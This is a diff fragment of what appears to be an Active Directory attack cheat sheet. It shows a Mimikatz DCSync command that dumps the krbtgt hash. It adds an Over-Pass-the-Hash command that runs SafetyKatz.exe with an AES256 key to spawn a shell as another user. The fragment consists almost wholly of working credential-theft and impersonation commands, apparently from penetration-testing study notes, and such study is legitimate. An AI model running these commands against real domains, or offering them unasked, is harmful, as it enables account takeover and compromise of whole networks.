@@ -274,6 +274,10 @@ DCSync (need LDAP SPN)
 ```powershell 
 lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com
 ```
+Over-Pass-the-Hash (SafetyKatz.exe)
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:user /domain:domain /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
+```
 ## Lateral Movement
 All the PS remoting 
 
